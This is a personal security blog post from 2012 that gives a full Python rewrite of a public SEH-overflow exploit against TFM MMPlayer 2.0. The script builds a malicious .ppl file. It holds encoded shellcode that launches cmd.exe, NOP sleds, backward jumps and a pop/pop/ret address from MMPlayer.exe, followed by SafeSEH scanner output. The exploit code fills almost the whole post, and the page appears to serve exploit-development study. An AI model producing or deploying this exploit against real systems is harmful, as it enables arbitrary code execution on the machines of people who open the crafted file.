<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>Mannthan</title><link href=/static/images/mannthan-32x32.png.webp sizes=32x32 rel=icon type=image/webp><script src=/static/js/highlight.min.js></script><script src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script><link rel=stylesheet href=/static/css/github-gist.min.css><link rel=stylesheet type=text/css href=/static/css/style.md.css media=screen></head><body><div class=header><table><tr><td><a href=/index.html style="color:#fe4164; font-size:14pt;">üè° Home </a></td><td><a href=/archive.html style="color:#f90; font-size:14pt;">üíæ Archive </a></td><td><a href=/tags.html style="color:#69359c; font-size:14pt;">üîñ Tags </a></td><td><a href=/stats.html style="color:#20b2aa; font-size:14pt;">üìä Stats</a></td></tr></table></div><div class=body><h1 class="h1 collapsible" onclick=toggle(this);>TFM MMPlayer .ppl File Parsing SEH Overflow</h1><p><a href=/posts/20120902_millenium-mpf-seh.html> ¬´ </a>üìÖ published on <code>02/Sep/2012</code><a href=/posts/20130102_geras-wuos-stack2-solutions.html> ¬ª </a></p><h2 class="h2 collapsible" onclick=toggle(this);>Introduction</h2><p class=nested>The TFM MMPlayer version 2.0 has a SEH overflow vulnerability. Processing specially-crafted <code>.ppl</code> file triggers SEH overwrite that could be leveraged further to gain arbitrary code execution. The exploit for this vulnerability has been documeneted at <a href=http://www.exploit-db.com/exploits/19176/ >EDB: 19176</a></p><h2 class="h2 collapsible" onclick=toggle(this);>Exploit Code</h2><p class=nested>Here is a complete rewrite of this exploit:</p><pre class=nested><code class=python>from struct import *

file = &quot;edb19176.ppl&quot;

# msfpayload windows/exec CMD=cmd.exe R | msfencode -b '\x00\x0a\x0d' -t perl
# [*] x86/shikata_ga_nai succeeded with size 226 (iteration=1)

cmmd = (&quot;\xda\xd5\xb8\x4f\xc1\x95\xae\xd9\x74\x24\xf4\x5a\x29\xc9&quot; +
&quot;\xb1\x32\x83\xc2\x04\x31\x42\x16\x03\x42\x16\xe2\xba\x3d&quot; +
&quot;\x7d\x27\x44\xbe\x7e\x58\xcd\x5b\x4f\x4a\xa9\x28\xe2\x5a&quot; +
&quot;\xba\x7d\x0f\x10\xee\x95\x84\x54\x26\x99\x2d\xd2\x10\x94&quot; +
&quot;\xae\xd2\x9c\x7a\x6c\x74\x60\x81\xa1\x56\x59\x4a\xb4\x97&quot; +
&quot;\x9e\xb7\x37\xc5\x77\xb3\xea\xfa\xfc\x81\x36\xfa\xd2\x8d&quot; +
&quot;\x07\x84\x57\x51\xf3\x3e\x56\x82\xac\x35\x10\x3a\xc6\x12&quot; +
&quot;\x80\x3b\x0b\x41\xfc\x72\x20\xb2\x77\x85\xe0\x8a\x78\xb7&quot; +
&quot;\xcc\x41\x47\x77\xc1\x98\x80\xb0\x3a\xef\xfa\xc2\xc7\xe8&quot; +
&quot;\x39\xb8\x13\x7c\xdf\x1a\xd7\x26\x3b\x9a\x34\xb0\xc8\x90&quot; +
&quot;\xf1\xb6\x96\xb4\x04\x1a\xad\xc1\x8d\x9d\x61\x40\xd5\xb9&quot; +
&quot;\xa5\x08\x8d\xa0\xfc\xf4\x60\xdc\x1e\x50\xdc\x78\x55\x73&quot; +
&quot;\x09\xfa\x34\x1e\xcc\x8e\x43\x67\xce\x90\x4b\xc8\xa7\xa1&quot; +
&quot;\xc0\x87\xb0\x3d\x03\xec\x4f\x74\x09\x45\xd8\xd1\xd8\xd7&quot; +
&quot;\x85\xe1\x37\x1b\xb0\x61\xbd\xe4\x47\x79\xb4\xe1\x0c\x3d&quot; +
&quot;\x25\x98\x1d\xa8\x49\x0f\x1d\xf9\x2a\xc2\x85\x2c\xc9\x64&quot; +
&quot;\x23\x31&quot;)

nop1 = &quot;\x90&quot;*3777
nop2 = &quot;\x90&quot;*100
jmp2 = &quot;\xE9\xA8\xFD\xFF\xFF&quot; # near jump (back) 600B (0xFFFFFDA8)
nseh = pack ('&lt;I', 0x9090C4EB)# short jump (back) 60B (0xFFC4)
cseh = pack ('&lt;I', 0x00401390)# p/p/r 00401390 MMPlayer.exe

sploit = nop1+cmmd+nop2+jmp2+nseh+cseh
#3777 226  100  544

try:
handle = open (file, 'w')
handle.write (sploit)
handle.close ()
print &quot;[+] sploit ready: &quot; + file + &quot; (&quot; + str (len (sploit)) + &quot;B)&quot;
except:
print &quot;[-] exception!&quot;

'''
/SafeSEH Module Scanner, item 18
 SEH mode=/SafeSEH OFF
 Base=0x400000
 Limit=0x47c000
 Module version=2.2.0.30
 Module Name=MMPlayer.exe
'''
</code></pre><p style=text-align:center;>(üîñ tagged <a href=/tags.html#code>code</a> and <a href=/tags.html#exploit>exploit</a>)</p><p style=text-align:center;>¬´ <a href=/posts/20120902_millenium-mpf-seh.html>Millennium MP3 Studio .mpf Fil...</a> ¬´ | ¬ª <a href=/posts/20130102_geras-wuos-stack2-solutions.html>Gera's Warming Up on Stack #2 ...</a> ¬ª</p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script><script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script><div class=footer><p><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div></body></html>